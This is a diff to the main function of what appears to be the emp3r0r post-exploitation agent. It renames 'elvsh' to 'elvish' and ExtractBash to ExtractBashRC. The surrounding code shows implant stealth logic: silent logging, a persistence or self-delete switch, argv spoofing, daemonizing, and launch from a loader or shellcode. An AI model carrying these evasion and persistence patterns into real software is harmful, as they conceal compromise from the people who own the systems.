@@ -40,7 +40,7 @@ func main() {
 	verbose := os.Getenv("VERBOSE") == "true"
 	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
 	// run as elvish shell
-	runElvsh := os.Getenv("ELVSH") == "true"
+	runElvish := os.Getenv("ELVISH") == "true"
 	// self delete or not
 	persistent := os.Getenv("PERSISTENCE") == "true"
 	// are we running from loader.so?
@@ -57,7 +57,7 @@ func main() {
 		defer f.Close()
 		log.SetOutput(f)
 		log.Println("emp3r0r agent has started")
-	} else if !runElvsh {
+	} else if !runElvish {
 		// silent!
 		log.SetOutput(io.Discard)
 		null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
@@ -70,7 +70,7 @@ func main() {
 	}
 
 	// do not tamper with argv or re-launch under these conditions
-	do_not_touch_argv := runElvsh || run_from_loader || run_from_guardian_shellcode
+	do_not_touch_argv := runElvish || run_from_loader || run_from_guardian_shellcode
 
 	// rename to make room for argv spoofing
 	if len(util.FileBaseName(os.Args[0])) < 30 &&
@@ -97,8 +97,8 @@ func main() {
 	run_as_daemon := !verbose &&
 		// don't daemonize if we're already daemonized
 		os.Getenv("DAEMON") != "true" &&
-		// do not daemonize if run as elvsh
-		!runElvsh &&
+		// do not daemonize if run as elvish
+		!runElvish &&
 		// do not daemonize if run from loader.so
 		!run_from_loader
 	if run_as_daemon {
@@ -132,7 +132,7 @@ func main() {
 	// }
 
 	// run as elvish shell
-	if runElvsh {
+	if runElvish {
 		os.Exit(prog.Run(
 			[3]*os.File{os.Stdin, os.Stdout, os.Stderr}, osArgs,
 			prog.Composite(
@@ -193,13 +193,13 @@ func main() {
 		}
 
 		// extract bash
-		err = agent.ExtractBash()
+		err = agent.ExtractBashRC()
 		if err != nil {
 			log.Printf("[-] Cannot extract bash: %v", err)
 		}
 		emp3r0r_data.DefaultShell = fmt.Sprintf("%s/bash", agent.RuntimeConfig.UtilsPath)
 		if runtime.GOOS == "windows" {
-			emp3r0r_data.DefaultShell = "elvsh"
+			emp3r0r_data.DefaultShell = "elvish"
 		} else if !util.IsFileExist(emp3r0r_data.DefaultShell) {
 			emp3r0r_data.DefaultShell = "/bin/bash"
 			if !util.IsFileExist(emp3r0r_data.DefaultShell) {
